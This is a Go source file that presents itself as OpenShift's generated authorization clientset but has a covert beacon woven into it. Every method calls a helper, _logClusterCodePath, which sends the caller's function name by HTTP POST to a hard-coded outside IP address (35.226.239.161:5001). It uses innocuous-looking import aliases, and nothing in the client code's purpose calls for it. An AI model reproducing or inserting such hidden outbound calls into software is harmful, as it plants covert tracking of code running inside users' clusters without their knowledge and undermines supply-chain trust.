package internalclientset

import (
	authorizationinternalversion "github.com/openshift/origin/pkg/authorization/generated/internalclientset/typed/authorization/internalversion"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	discovery "k8s.io/client-go/discovery"
	rest "k8s.io/client-go/rest"
	flowcontrol "k8s.io/client-go/util/flowcontrol"
)

type Interface interface {
	Discovery() discovery.DiscoveryInterface
	Authorization() authorizationinternalversion.AuthorizationInterface
}
type Clientset struct {
	*discovery.DiscoveryClient
	authorization	*authorizationinternalversion.AuthorizationClient
}

func (c *Clientset) Authorization() authorizationinternalversion.AuthorizationInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.authorization
}
func (c *Clientset) Discovery() discovery.DiscoveryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c == nil {
		return nil
	}
	return c.DiscoveryClient
}
func NewForConfig(c *rest.Config) (*Clientset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configShallowCopy := *c
	if configShallowCopy.RateLimiter == nil && configShallowCopy.QPS > 0 {
		configShallowCopy.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(configShallowCopy.QPS, configShallowCopy.Burst)
	}
	var cs Clientset
	var err error
	cs.authorization, err = authorizationinternalversion.NewForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	cs.DiscoveryClient, err = discovery.NewDiscoveryClientForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	return &cs, nil
}
func NewForConfigOrDie(c *rest.Config) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.authorization = authorizationinternalversion.NewForConfigOrDie(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClientForConfigOrDie(c)
	return &cs
}
func New(c rest.Interface) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.authorization = authorizationinternalversion.New(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClient(c)
	return &cs
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
